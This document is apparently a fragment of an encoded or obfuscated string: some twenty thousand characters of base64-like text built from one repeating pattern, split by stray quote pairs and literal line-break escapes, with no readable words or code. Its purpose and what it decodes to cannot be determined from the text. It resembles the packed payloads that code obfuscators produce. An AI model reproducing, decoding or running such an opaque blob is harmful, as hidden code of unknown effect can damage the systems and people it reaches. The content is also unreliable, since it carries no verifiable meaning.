igaLigIvigazigIvigaXigIvigYLigIvigaXigIvigK3igIvi""\nga3igIvigafigIvigaTigIvigbzigIvigY7igIvigaXigIvigb/igIvigbnigIvigbLigIvigLbigIvi\ngZjigIvigaLigIvigazigIvigaXigIvigZ7igIvigbvigIvigK3igIvigZ/igIvigYfigIvigLbigIvi\ngKzigIvigKDigIvigb/igIvigafigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKzigIvigb7igIvigbjigIviga7igIvigbnigIvigKbigIvigarigIvigazigIviga7igIvigaXigIvi\ngb/igIvigKzigIvigLHigIvigKvigIvigazigIvigazigIviganigIvigKPigIvigKLigIvigKfigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigbbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvigarigIvigbnigIvi\ngarigIvigabigIvigbjigIvigKvigIvigLbigIvigKvigIvigbDigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKzigIvigZ/igIvigYfigIvigKzigIvigLHigIvigKvigIvigb/igIvigafigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigbbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIviga/igIvigarigIvi\ngb/igIvigarigIvigKvigIvigLbigIvigKvigIvigKzigIvigajigIvigaTigIvigaXigIvigb/igIvi\ngaLigIvigaXigIvigb7igIviga7igIvigLbigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvi\ngK7igIvigLjigIvigYrigIvigK7igIvigLnigIvigY3igIvigK7igIvigLnigIvigY3igIvigabigIvi\ngarigIvigaLigIvigafigIvigKXigIvigazigIvigaTigIvigaTigIvigazigIvigafigIviga7igIvi\ngKXigIvigajigIvigaTigIvigabigIvigK7igIvigLnigIvigY3igIvigabigIvigarigIvigaLigIvi\ngafigIvigK7igIvigLnigIvigY3igIvigb7igIvigK7igIvigLnigIvigY3igIvigLvigIvigK7igIvi\ngLnigIvigY3igIvigK3igIviga/igIviga/igIvigabigIvigLbigIvigLvigIvigK3igIviga3igIvi\ngafigIvigaTigIvigbzigIvigY7igIvigaXigIvigb/igIvigbnigIvigbLigIvigLbigIvigZjigIvi\ngaLigIvigazigIvigaXigIvigZ7igIvigbvigIvigK3igIvigbjigIviga7igIvigbnigIvigb3igIvi\ngaLigIvigajigIviga7igIvigLbigI""vigabigIvigarigIvigaLigIvigafigIvigK3igIvigb/igIvi\ngaPigIviga7igIvigabigIviga7igIvigLbigIvigabigIvigaXigIvigK3igIviga3igIvigKXigIvi\ngbnigIviga7igIvigbrigIvigLbigIvigK7igIvigL7igIvigYnigIvigK7igIvigLnigIvigLnigIvi\ngZ/igIvigYfigIvigK7igIvigLjigIvigYrigIvigKzigIvigKDigIvigb/igIvigafigIvigKDigIvi\ngKzigIvigK7igIvigLnigIvigLnigIvigK7igIvigLnigIvigYjigIvigK7igIvigLnigIvigLnigIvi\ngKzigIvigKDigIviga7igIvigabigIvigarigIvigaLigIvigafigIvigKDigIvigKzigIvigK7igIvi\ngLnigIvigLnigIvigK7igIvigLnigIvigYjigIvigLvigIvigK7igIvigLnigIvigYjigIvigLvigIvi\ngK7igIvigLnigIvigYjigIvigLrigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvi\ngafigIvigK7igIvigLnigIvigYjigIvigLvigIvigK7igIvigLnigIvigYjigIvigL7igIvigLrigIvi\ngL3igIvigLzigIvigK7igIvigL7igIvigY/igIvigK3igIvigarigIvigbHigIvigb/igIvigLbigIvi\ngYrigIvigY3igIvigaTigIvigarigIvigazigIvigZ7igIvigZ7igIvigb/igIvigZnigIvigafigIvi\ngb3igIvigZ3igIvigLLigIvigLnigIvigLPigIvigaTigIvigZjigIvigLLigIvigYTigIvigLzigIvi\ngY3igIvigL3igIviga7igIviga7igIvigYLigIvigL/igIviga/igIvigYjigIvigYTigIvigLnigIvi\ngbnigIvigLrigIvigaLigIvigazigIvigK7igIvigLjigIvigYrigIvigLrigIvigLzigIvigLrigIvi\ngLnigIvigLjigIvigLnigIvigLnigIvigL/igIvigL3igIvigLvigIvigLPigIvigLPigIvigLPigIvi\ngK3igIvigajigIvigaTigIvigaTigIvigaDigIvigaLigIviga7igIvigbjigIvigY/igIvigaLigIvi\ngbjigIvigarigIviganigIvigafigIviga7igIviga/igIvigLbigIviga3igIvigarigIvigafigIvi\ngbjigIviga7igIvigK3igIviga/igIviga7igIvigb3igIvigaLigIvigajigIviga7igIvigaLigIvi\ngaXigIviga3igIvigaTigIvigLbigIvigK7igIvigL7igIvigYnigIvigaXigIvigb7igIvigafigIvi\ngafigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvi\ngYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvi\ngafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvi\ngLnigIvigYjigIvigK7igIvigLnigIvigLnigIvigYXigIvigYfigIvigK7igIvigLnigIvigLnigIvi\ngK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvi\ngaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigI""vigb7igIvigafigIvi\ngafigIvigK7igIvigLnigIvigYjigIvigK7igIvigLnigIvigLnigIvigYzigIvigafigIvigaLigIvi\nga3igIvigZzigIviga7igIviganigIvigZjigIvigaLigIvigazigIvigaXigIvigYLigIvigaXigIvi\ngK7igIvigLnigIvigLnigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvi\ngK7igIvigLnigIvigYjigIvigK7igIvigL7igIvigYnigIvigK7igIvigL7igIvigY/igIvigK7igIvi\ngLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigIvi\ngb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvi\ngK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvigYjigIvi\ngLnigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvigLnigIvi\ngYjigIvigLvigIvigK7igIvigLnigIvigYjigIvigLrigIvigK7igIvigLnigIvigYjigIvigK7igIvi\ngLnigIvigLnigIvigK7igIvigLnigIvigLnigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvi\ngafigIvigafigIvigK7igIvigLnigIvigYjigIvigaXigIvigb7igIvigafigIvigafigIvigK7igIvi\ngLnigIvigYjigIvigLnigIvigK7igIvigLnigIvigYjigIvigLnigIvigK7igIvigL7igIvigY/igIvi\ngK3igIvigazigIvigabigIvigbjigIvigajigIvigaTigIvigbnigIviga7igIvigb3igIviga7igIvi\ngbnigIvigbjigIvigaLigIvigaTigIvigaXigIvigLbigIvigb7igIvigaXigIviga/igIviga7igIvi\nga3igIvigaLigIvigaXigIviga7igIviga/igIvigK3igIviga3igIvigafigIvigaTigIvigbzigIvi\ngYXigIvigarigIvigabigIviga7igIvigLbigIvigYzigIvigafigIvigaLigIviga3igIvigZzigIvi\nga7igIviganigIvigZjigIvigaLigIvigazigIvigaXigIvigYLigIvigaXigIvigK3igIvigKzigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbnigIviga7igIvigbjigIvigbvigIvigaTigIvi\ngaXigIvigbjigIviga7igIvigKvigIvigLbigIvigKvigIvigbvigIvigbvigIvigKPigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigaPigIvi\ngb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigarigIvigajigIvigajigIvi\ngaTigIvigb7igIvigaXigIvigb/igIvigbjigIvigKXigIvigazigIvigaTigIvigaTigIvigazigIvi\ngafigIviga7i""gIvigKXigIvigajigIvigaTigIvigabigIvigKTigIvigZTigIvigKTigIvigbjigIvi\ngaLigIvigazigIvigaXigIvigb7igIvigbvigIvigKTigIvigb7igIvigbjigIviga7igIvigbnigIvi\ngaXigIvigarigIvigabigIviga7igIvigarigIvigb3igIvigarigIvigaLigIvigafigIvigarigIvi\nganigIvigaLigIvigafigIvigaLigIvigb/igIvigbLigIvigKzigIvigKfigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvigarigIvigbnigIvi\ngarigIvigabigIvigbjigIvigLbigIvigbvigIvigarigIvigbnigIvigarigIvigabigIvigbjigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngajigIvigaTigIvigaTigIvigaDigIvigaLigIviga7igIvigbjigIvigLbigIvigajigIvigaTigIvi\ngaTigIvigaDigIvigaLigIviga7igIvigbjigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigaPigIviga7igIvigarigIviga/igIviga7igIvi\ngbnigIvigbjigIvigLbigIvigaPigIviga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\nga/igIvigarigIvigb/igIvigarigIvigLbigIviga/igIvigarigIvigb/igIvigarigIvigKfigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigaLigIviga3igIvigKvigIvigKzigIvigKnigIvigazigIviga3igIvigKXigIvigb7igIvi\ngarigIvigbnigIvigKnigIvigKfigIvigLrigIvigKzigIvigKvigIvigaLigIvigaXigIvigKvigIvi\ngbjigIvigb/igIvigbnigIvigKPigIvigbnigIviga7igIvigbjigIvigbvigIvigaTigIvigaXigIvi\ngbjigIviga7igIvigKXigIvigb/igIviga7igIvigbPigIvigb/igIvigKLigIvigLHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHi""gIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigaPigIvigaLigIvi\ngb/igIvigbjigIvigKvigIvigKDigIvigLbigIvigKvigIvigLrigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvigbvigIvigbvigIvigbvigIvi\ngKPigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigaLigIviga3igIvigKvigIvigKzigIvigYvigIvigKzigIvigKvigIvigaXigIvigaTigIvi\ngb/igIvigKvigIvigaLigIvigaXigIvigKvigIviga7igIvigabigIvigarigIvigaLigIvigafigIvi\ngLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigaTigIvigaDigIvigKvigIvigLbigIvigKvigIviga7igIvi\ngabigIvigarigIvigaLigIvigafigIvigKvigIvigKDigIvigKvigIvigKzigIvigYvigIvigazigIvi\ngabigIvigarigIvigaLigIvigafigIvigKXigIvigajigIvigaTigIvigabigIvigKzigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvi\ngKfigIvigKvigIvigazigIvigazigIvigKvigIvigLbigIvigKvigIvigaTigIvigaDigIvigKXigIvi\ngbjigIvigbvigIvigafigIvigaLigIvigb/igIvigKPigIvigKzigIvigYvigIvigKzigIvigKLigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigYLigIvigaXigIviga3igIvigaTigIvigYrigIvigajigIvigajigIvi\ngKPigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKfigIvi\ngKvigIvigazigIvigazigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvi""gIvi\ngKvigIvigKvigIvigKvigIviga7igIvigafigIvigbjigIviga7igIvigLHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKfigIvi\ngKvigIvigazigIvigazigIvigKvigIvigLbigIvigKvigIviga7igIvigabigIvigarigIvigaLigIvi\ngafigIvigKXigIvigbjigIvigbvigIvigafigIvigaLigIvigb/igIvigKPigIvigKzigIvigYvigIvi\ngKzigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigYLigIvigaXigIviga3igIvigaTigIvigYrigIvi\ngajigIvigajigIvigKPigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIvi\nga7igIvigKfigIvigKvigIvigazigIvigazigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIviga7igIvigafigIvigbjigIviga7igIvigLHigIvigKvigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviganigIvigarigIviga/igIviga7igIvigabigIvigarigIvi\ngaLigIvigafigIvigKDigIvigLbigIvigLrigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigbvigIvigbvigIvigbvigIvigbvigIvigKPigIvigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvi\ngbPigIvigajigIviga7igIvigbvigIvigb/igIvigLHigIvigKzigIvigKzigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIviga/igIvi\nga7igIviga3igIvigKvigIviga3igIvigaTigIvigbnigIvigabigIvigarigIvigb/igIvigZTigIvi\ngaXigIvigb7igIvigabigIviganigIviga7igIvigbnigIvigKPigIvigb3igIvigarigIvigafigIvi\ngb7igIviga7igIvigKLigIvigL""HigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigb3igIvigarigIvigafigIvigb7igIviga7igIvi\ngKvigIvigLbigIvigKvigIviga3igIvigafigIvigaTigIvigarigIvigb/igIvigKPigIvigb3igIvi\ngarigIvigafigIvigb7igIviga7igIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigaLigIviga3igIvigKvigIvigb3igIvi\ngarigIvigafigIvigb7igIviga7igIvigKvigIvigLXigIvigLbigIvigKvigIvigLrigIvigLvigIvi\ngLvigIvigLvigIvigLvigIvigLvigIvigLvigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigbnigIviga7igIvigb/igIvigb7igIvigbnigIvigaXigIvigKvigIviga3igIvigKnigIvi\ngbDigIvigb3igIvigarigIvigafigIvigb7igIviga7igIvigKvigIvigKTigIvigKvigIvigLrigIvi\ngLvigIvigLvigIvigLvigIvigLvigIvigLvigIvigLvigIvigLHigIvigKXigIvigLrigIviga3igIvi\ngbbigIvigabigIvigKnigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviga7igIvigafigIvigaLigIviga3igIvigKvigIvigb3igIvi\ngarigIvigafigIvigb7igIviga7igIvigKvigIvigLXigIvigLbigIvigKvigIvigLrigIvigLvigIvi\ngLvigIvigLvigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbnigIviga7igIvi\ngb/igIvigb7igIvigbnigIvigaXigIvigKvigIviga3igIvigKnigIvigbDigIvigb3igIvigarigIvi\ngafigIvigb7igIviga7igIvigKvigIvigKTigIvigKvigIvigLrigIvigLvigIvigLvigIvigLvigIvi\ngLHigIvigKXigIvigLrigIviga3igIvigbbigIvigaDigIvigKnigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigbnigIviga7igIvi\ngb/igIvigb7igIvigbnigIvigaXigIvigKvigIvigbjigIvigb/igIvigbnigIvigKPigIvigaLigIvi\ngaXigIvigb/igIvigKPigIvigb3igIvigarigIvigafigIvigb7igIviga7igIvigKLigIvigKLigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIviga/igIviga7igIviga3igIvigKvigIvigajigIvigaPigIvi\nga7igIvigajigIvigaDigIvigZTigIvigaTigIvigaXigIvigKPigIviga""7igIvigabigIvigarigIvi\ngaLigIvigafigIvigKLigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigazigIvigafigIvigaTigIviganigIvigarigIvi\ngafigIvigKvigIvigazigIvigaTigIvigaTigIviga/igIvigaLigIvigazigIvigKfigIvigKvigIvi\nganigIvigarigIviga/igIvigaLigIvigaXigIvigbjigIvigb/igIvigarigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigb7igIvi\ngarigIvigKvigIvigLbigIvigKvigIvigazigIviga7igIvigaXigIviga7igIvigbnigIvigarigIvi\ngb/igIviga7igIvigZTigIvigb7igIvigbjigIviga7igIvigbnigIvigZTigIvigarigIvigazigIvi\nga7igIvigaXigIvigb/igIvigKPigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga/igIviga7igIvigb3igIvigKvigIvi\ngLbigIvigKvigIvigKzigIvigarigIvigaXigIviga/igIvigbnigIvigaTigIvigaLigIviga/igIvi\ngKbigIvigKzigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIviga/igIviga7igIvigb3igIvigaLigIvigajigIviga7igIvigZTigIvi\ngaLigIviga/igIvigKvigIvigLbigIvigKvigIviga/igIviga7igIvigb3igIvigKvigIvigKDigIvi\ngKvigIvigaPigIvigarigIvigbjigIvigaPigIvigafigIvigaLigIviganigIvigKXigIvigabigIvi\nga/igIvigL7igIvigKPigIvigbjigIvigb/igIvigbnigIvigKPigIvigb7igIvigb7igIvigaLigIvi\nga/igIvigKXigIvigb7igIvigb7igIvigaLigIviga/igIvigL/igIvigKPigIvigKLigIvigKLigIvi\ngKXigIviga7igIvigaXigIvigajigIvigaTigIviga/igIviga7igIvigKPigIvigKLigIvigKLigIvi\ngKXigIvigaPigIviga7igIvigbPigIviga/igIvigaLigIvigazigIviga7igIvigbjigIvigb/igIvi\ngKPigIvigKLigIvigZDigIvigLHigIvigLrigIvigL3igIvigZbigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigb7igIvigb7igIvi\ngaLigIvigKvigIvigLbigIvigKvigIvigbjigIvigb/igIvigbnigIvigKPigIvigb7igIvigb7igIvi\ngaLigIviga/igIvigKXigIvigb7igIvigb7igIvigaLigIviga/igIvigL/igIvigKPigIvigKLigIvi\ngKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigaPigIviga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvigKvigIvi\ngLbigIvi""gKvigIvigbDigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigZ7igIvi\ngbjigIviga7igIvigbnigIvigKbigIvigYrigIvigazigIviga7igIvigaXigIvigb/igIvigKzigIvi\ngLHigIvigKvigIvigb7igIvigarigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKzigIvigYjigIvigaTigIvigaTigIvigaDigIvigaLigIviga7igIvigKzigIvigLHigIvigKvigIvi\ngKzigIvigabigIvigaLigIviga/igIvigLbigIvigZHigIvigZ3igIviga3igIvigYzigIvigb3igIvi\ngazigIvigYrigIvigYnigIvigYrigIvigYrigIvigYzigIvigaTigIvigZrigIvigbrigIvigarigIvi\ngLzigIvigYrigIvigZLigIvigLjigIvigabigIvigazigIvigaTigIvigZLigIvigYnigIvigZ3igIvi\ngLrigIvigaXigIvigZvigIvigLDigIvigKvigIvigajigIvigbjigIvigbnigIviga3igIvigb/igIvi\ngaTigIvigaDigIviga7igIvigaXigIvigLbigIvigLLigIvigbLigIvigLjigIvigYXigIvigL7igIvi\ngaDigIvigYfigIvigbrigIvigbHigIvigaLigIvigarigIvigafigIvigZrigIvigYrigIvigLzigIvi\ngbHigIvigLLigIvigL3igIvigYrigIvigYbigIvigaLigIvigbLigIvigYrigIvigYDigIvigYfigIvi\ngYbigIvigYnigIvigZzigIvigbvigIvigbrigIvigZ3igIvigaHigIvigKzigIvigKfigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigYjigIvigaTigIvigaXigIvigb/igIviga7igIvi\ngaXigIvigb/igIvigKbigIvigZ/igIvigbLigIvigbvigIviga7igIvigKzigIvigLHigIvigKvigIvi\ngKzigIvigarigIvigbvigIvigbvigIvigafigIvigaLigIvigajigIvigarigIvigb/igIvigaLigIvi\ngaTigIvigaXigIvigKTigIvigbPigIvigKbigIvigbzigIvigbzigIvigbzigIvigKbigIviga3igIvi\ngaTigIvigbnigIvigabigIvigKbigIvigb7igIvigbnigIvigafigIviga7igIvigaXigIvigajigIvi\ngaTigIviga/igIviga7igIviga/igIvigLDigIvigKvigIvigajigIvigaPigIvigarigIvigbnigIvi\ngbjigIviga7igIvigb/igIvigLbigIvigZ7igIvigZ/igIvigY3igIvigKbigIvigLPigIvigKzigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigbbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviga/igIvi""garigIvigb/igIvigarigIvigKvigIvigLbigIvi\ngKvigIvigbDigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigbjigIvigaLigIvi\ngazigIvigaXigIviga7igIviga/igIvigZTigIviganigIvigaTigIviga/igIvigbLigIvigKzigIvi\ngLHigIvigKvigIvigKzigIvigLvigIviga/igIvigLvigIvigL3igIvigLzigIvigajigIvigLnigIvi\nga3igIvigLPigIvigL3igIvigajigIvigarigIvigajigIvigLnigIvigajigIvigLrigIvigLzigIvi\nga/igIvigL3igIvigL7igIvigL7igIvigL3igIvigLjigIvigLrigIvigajigIvigLLigIvigajigIvi\nga7igIvigajigIvigLnigIvigL/igIvigLvigIvigLnigIvigLvigIvigLrigIvigLnigIviga3igIvi\nganigIvigLvigIvigarigIvigLjigIvigLnigIvigLLigIviganigIvigajigIvigarigIviga3igIvi\nganigIvigLjigIviganigIvigLrigIviga3igIvigL/igIvigajigIvigLvigIviganigIviganigIvi\ngL7igIvigL3igIviganigIvigLrigIviga3igIvigLrigIviga3igIvigKXigIvigKzigIvigKvigIvi\ngKDigIvigKvigIvigaHigIvigbjigIvigaTigIvigaXigIvigKXigIviga/igIvigb7igIvigabigIvi\ngbvigIvigbjigIvigKPigIvigbDigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIvigZTigIvigajigIvigbjigIvigbnigIviga3igIvigb/igIvi\ngaTigIvigaDigIviga7igIvigaXigIvigKzigIvigLHigIvigKvigIvigKzigIvigLLigIvigbLigIvi\ngLjigIvigYXigIvigL7igIvigaDigIvigYfigIvigbrigIvigbHigIvigaLigIvigarigIvigafigIvi\ngZrigIvigYrigIvigLzigIvigbHigIvigLLigIvigL3igIvigYrigIvigYbigIvigaLigIvigbLigIvi\ngYrigIvigYDigIvigYfigIvigYbigIvigYnigIvigZzigIvigbvigIvigbrigIvigZ3igIvigaHigIvi\ngKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKzigIvigarigIviga/igIvigaLigIviga/igIvigKzigIvigLHigIvigKvigIvigb7igIvi\ngb7igIvigaLigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKzigIvigazigIvigb7igIvigaLigIviga/igIvigKzigIvigLHigIvi""gKvigIvi\ngb7igIvigb7igIvigaLigIvigKfigIvigIHigI